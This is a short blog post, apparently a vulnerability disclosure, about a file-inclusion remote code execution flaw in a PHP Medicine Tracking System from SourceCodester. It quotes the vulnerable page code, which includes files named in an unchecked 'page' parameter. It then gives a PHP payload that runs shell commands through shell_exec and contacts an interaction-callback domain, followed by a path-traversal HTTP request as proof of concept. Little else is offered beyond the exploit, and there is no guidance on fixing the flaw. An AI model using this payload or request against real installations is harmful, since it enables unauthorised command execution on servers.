=== Content from medium.com_665a97f4_20250114_204740.html ===
[Open in app](https://rsci.app.link/?%24canonical_url=https%3A%2F%2Fmedium.com%2Fp%2F1f009165b915&%7Efeature=LoOpenInAppButton&%7Echannel=ShowPostUnderUser&source=---top_nav_layout_nav----------------------------------)

Sign up

[Sign in](/m/signin?operation=login&redirect=https%3A%2F%2Fmedium.com%2F%40heishou%2Fmedicine-tracking-system-rce-vulnerability-1f009165b915&source=post_page---top_nav_layout_nav-----------------------global_nav-----------)

[Write](/m/signin?operation=register&redirect=https%3A%2F%2Fmedium.com%2Fnew-story&source=---top_nav_layout_nav-----------------------new_post_topnav-----------)

Sign up

[Sign in](/m/signin?operation=login&redirect=https%3A%2F%2Fmedium.com%2F%40heishou%2Fmedicine-tracking-system-rce-vulnerability-1f009165b915&source=post_page---top_nav_layout_nav-----------------------global_nav-----------)

![](https://miro.medium.com/v2/resize:fill:64:64/1*dmbNkD5D-u45r44go_cf0g.png)
# Medicine Tracking System RCE Vulnerability

[![heishou](https://miro.medium.com/v2/resize:fill:88:88/1*pR2bjEaLc11S00QyPXDWFA.png)](/%40heishou?source=post_page---byline--1f009165b915--------------------------------)

[heishou](/%40heishou?source=post_page---byline--1f009165b915--------------------------------)

·

[Follow](/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fsubscribe%2Fuser%2Ffc1fddf341cd&operation=register&redirect=https%3A%2F%2Fmedium.com%2F%40heishou%2Fmedicine-tracking-system-rce-vulnerability-1f009165b915&user=heishou&userId=fc1fddf341cd&source=post_page-fc1fddf341cd--byline--1f009165b915---------------------post_header-----------)

3 min read·Dec 26, 2023

--

Listen

Share

Vulnerability Author：

heishou

Affected versions:

1. 0

Manufacturer:
https://www.sourcecodester.com/
Download:
<https://www.sourcecodester.com/sites/default/files/download/oretnom23/php-mts_0.zip>

Vulnerability Details:

```
<?php
require_once('../config.php');
$page = isset($_GET['page']) ? $_GET['page'] : 'home';
$page_name = explode("/",$page)[count(explode("/",$page)) -1];
?>
<!DOCTYPE html>
<html lang="en" itemscope itemtype="http://schema.org/WebPage">

<?php include_once('includes/header.php') ?>

<body class="index-page bg-gray-200">
    <script>start_loader()</script>
    <?php include_once('includes/top-navigation.php') ?>
    <header class="header-2">
        <div class="page-header min-vh-55 relative" style="background-image: url('<?= validate_image($_settings->info('cover')) ?>')">
            <span class="mask bg-gradient-dark opacity-4"></span>
            <div class="container">
                <div class="row">
                    <div class="col-lg-10 text-center mx-auto">
                        <h1 class="text-white pt-3 mt-n5"><?= $_settings->info('name') ?></h1>
                        <p class="lead text-white mt-3"><?= ucwords(str_replace(["_","/"]," ",$page)). " Page" ?></p>
                    </div>
                </div>
            </div>
        </div>
    </header>
    <div class="card card-body blur shadow-blur mx-3 mx-md-4 mt-n6">
        <?php
        if($_settings->chk_flashdata('success')):
        ?>
        <div class="alert alert-success ?> rounded-0 text-light py-1 px-4 mx-3">
            <div class="d-flex w-100 align-items-center">
                <div class="col-10">
                    <?= $_settings->flashdata('success') ?>
                </div>
                <div class="col-2 text-end">
                    <button class="btn m-0 text-sm" type="button" onclick="$(this).closest('.alert').remove()"><i class="material-icons mb-0">close</i></button>
                </div>
            </div>
        </div>
        <?php endif; ?>
        <?php
        if(is_file($page.'.php')){
            include $page.'.php';
        }else{
            if(is_dir($page) && is_file($page.'/index.php')){
                include $page.'/index.php';
            }else{
                echo '<h4 class="text-center fw-bolder">Page Not Found</h4>';
            }
        }
        ?>
    </div>

    <div class="modal fade" id="uni_modal" role='dialog' data-bs-backdrop="static">
        <div class="modal-dialog modal-md modal-dialog-centered" role="document">
        <div class="modal-content rounded-0">
            <div class="modal-header">
            <h5 class="modal-title"></h5>
        </div>
        <div class="modal-body">
        </div>
        <div class="modal-footer">
            <button type="button" class="btn btn-primary btn-sm rounded-0" id='submit' onclick="$('#uni_modal form').submit()">Save</button>
            <button type="button" class="btn btn-secondary btn-sm rounded-0" data-bs-dismiss="modal">Cancel</button>
        </div>
        </div>
        </div>
    </div>
    <div class="modal fade" id="uni_modal_right" role='dialog' data-bs-backdrop="static">
        <div class="modal-dialog modal-full-height  modal-md" role="document">
        <div class="modal-content rounded-0">
            <div class="modal-header">
            <h5 class="modal-title"></h5>
            <button type="button" class="close" data-bs-dismiss="modal" aria-label="Close">
            <span class="fa fa-arrow-right"></span>
            </button>
        </div>
        <div class="modal-body">
        </div>
        </div>
        </div>
    </div>
    <div class="modal fade" id="viewer_modal" role='dialog' data-bs-backdrop="static">
        <div class="modal-dialog modal-md" role="document">
        <div class="modal-content rounded-0">
                <button type="button" class="btn-close" data-bs-dismiss="modal"><span class="fa fa-times"></span></button>
                <img src="" alt="">
        </div>
        </div>
    </div>
    <div class="modal fade" id="confirm_modal" role='dialog' data-bs-backdrop="static">
        <div class="modal-dialog modal-md modal-dialog-centered" role="document">
        <div class="modal-content rounded-0">
            <div class="modal-header">
            <h5 class="modal-title">Confirmation</h5>
        </div>
        <div class="modal-body">
            <div id="delete_content"></div>
        </div>
        <div class="modal-footer">
            <button type="button" class="btn btn-primary btn-sm rounded-0" id='confirm' onclick="">Continue</button>
            <button type="button" class="btn btn-secondary btn-sm rounded-0" data-bs-dismiss="modal">Close</button>
        </div>
        </div>
        </div>
    </div>
    <?php include_once('includes/footer.php') ?>

</body>

</html>
```

EXP:

```
<?php
$domain = "{interact}";
$ip = gethostbyname($domain);
$command = "ipconfig";
$output = shell_exec($command);
echo "<pre>$output</pre>";
?>
```

POC:

```
GET /php-mts/app/?page=index/../../../../1 HTTP/1.1
Host: localhost
sec-ch-ua: "(Not(A:Brand";v="8", "Chromium";v="98"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: USER_NAME_COOKIE=admin; SID_1=aa141d36; mailpoet_page_view=%7B%22timestamp%22%3A1694409700%7D; mailpoet_subscriber=%7B%22subscriber_id%22%3A2%7D; _ga=GA1.1.324136046.1702458922; Hm_lvt_6a3c7d9bb52a48ffadde32007d2a259e=1702459185; _pk_id.1.1fff=4343a030b8a53617.1702459185.
Connection: close

```
![]()

--

--

[![heishou](https://miro.medium.com/v2/resize:fill:96:96/1*pR2bjEaLc11S00QyPXDWFA.png)](/%40heishou?source=post_page---post_author_info--1f009165b915--------------------------------)[![heishou](https://miro.medium.com/v2/resize:fill:128:128/1*pR2bjEaLc11S00QyPXDWFA.png)](/%40heishou?source=post_page---post_author_info--1f009165b915--------------------------------)Follow[## Written by heishou](/%40heishou?source=post_page---post_author_info--1f009165b915--------------------------------)[1 Follower](/%40heishou/followers?source=post_page---post_author_info--1f009165b915--------------------------------)·[3 Following](/%40heishou/following?source=post_page---post_author_info--1f009165b915--------------------------------)

Pretending to make you fly

Follow
## No responses yet

[Help](https://help.medium.com/hc/en-us?source=post_page-----1f009165b915--------------------------------)[Status](https://medium.statuspage.io/?source=post_page-----1f009165b915--------------------------------)[About](/about?autoplay=1&source=post_page-----1f009165b915--------------------------------)[Careers](/jobs-at-medium/work-at-medium-959d1a85284e?source=post_page-----1f009165b915--------------------------------)[Press](pressinquiries%40medium.com?source=post_page-----1f009165b915--------------------------------)[Blog](https://blog.medium.com/?source=post_page-----1f009165b915--------------------------------)[Privacy](https://policy.medium.com/medium-privacy-policy-f03bf92035c9?source=post_page-----1f009165b915--------------------------------)[Terms](https://policy.medium.com/medium-terms-of-service-9db0094a1e0f?source=post_page-----1f009165b915--------------------------------)[Text to speech](https://speechify.com/medium?source=post_page-----1f009165b915--------------------------------)[Teams](/business?source=post_page-----1f009165b915--------------------------------)


